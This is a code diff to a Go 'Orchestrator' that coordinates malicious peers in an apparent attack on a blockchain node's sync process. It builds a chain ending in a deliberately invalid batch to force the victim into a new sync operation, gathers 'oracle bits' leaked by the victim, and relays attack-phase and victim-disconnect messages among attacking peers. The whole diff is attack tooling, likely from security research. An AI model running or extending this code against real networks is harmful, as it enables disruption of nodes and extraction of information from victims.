@@ -47,7 +47,10 @@ func (o *Orchestrator) Start(rebuild bool) {
 	go o.handleMessages()
 	go o.addPeers()
 	go func() {
-		err := buildchain.BuildChain(utils.PredictionChain, utils.NumBatchesForPrediction*utils.BatchSize+88, rebuild)
+		predictionChainLength := (utils.NumBatchesForPrediction+1)*utils.BatchSize		// Build one invalid batch
+																						// in the end to force victim
+																						// to start a new syncOp
+		err := buildchain.BuildChain(utils.PredictionChain, predictionChainLength, rebuild)
 		if err != nil {
 			o.errc <- err
 			o.close()
@@ -138,7 +141,7 @@ func (o *Orchestrator) leadAttack() {
 
 	for {
 		bit := <-o.oracleCh
-		fmt.Println("Received new oracle bit")
+		fmt.Println("Received new oracle bit:", bit)
 		o.oracleReply = append(o.oracleReply, bit)
 		
 		if len(o.oracleReply)==utils.RequiredOracleBits {
@@ -161,14 +164,17 @@ func (o *Orchestrator) handleMessages() {
 
 			switch message.Code {
 			case msg.BatchRequestServed.Code:
-				err := o.send(o.peerset.masterPeer, message)
-				if err != nil {
-					o.errc <- err
-					o.close()
-					return
-				}
+				go func() {
+					err := o.send(o.peerset.masterPeer, message)
+					if err != nil {
+						o.errc <- err
+						o.close()
+						return
+					}
+				}()
 			case msg.MasterPeer.Code:
 				o.peerset.masterPeer = sender
+				fmt.Println("Master peer " + o.peerset.masterPeer.id + " is now leading victim sync")
 			case msg.SetVictim.Code:
 				victimID := string(message.Content)
 				if o.victim == "" {
@@ -180,16 +186,44 @@ func (o *Orchestrator) handleMessages() {
 					o.close()
 					return
 				}
-				fmt.Println("Master peer " + o.peerset.masterPeer.id + " is now leading victim sync")
-				err := o.sendAllExcept(message, sender)
-				if err != nil {
-					o.errc <- err
-					o.close()
-					return
-				}
+				go func() {
+					err := o.sendAllExcept(message, sender)
+					if err != nil {
+						o.errc <- err
+						o.close()
+						return
+					}
+				}()
 			case msg.SetAttackPhase.Code:
 				o.attackPhase = utils.AttackPhase(message.Content[0])
-				go o.sendAllExcept(message, sender)
+				go func() {
+					err := o.sendAllExcept(message, sender)
+					if err != nil {
+						o.errc <- err
+						o.close()
+						return
+					}
+				}()
+			case msg.OracleBit.Code:
+				o.oracleCh <- message.Content[0]
+			case msg.MustDisconnectVictim.Code:
+				go func() {
+					err := o.sendAllExcept(message, sender)
+					if err != nil {
+						o.errc <- err
+						o.close()
+						return
+					}
+				}()
+			case msg.SolicitMustDisconnectVictim.Code:
+				go func() {
+					err := o.sendAllExcept(message, sender)
+					if err != nil {
+						o.errc <- err
+						o.close()
+						return
+					}
+				}()
 			}
 		}
 	}
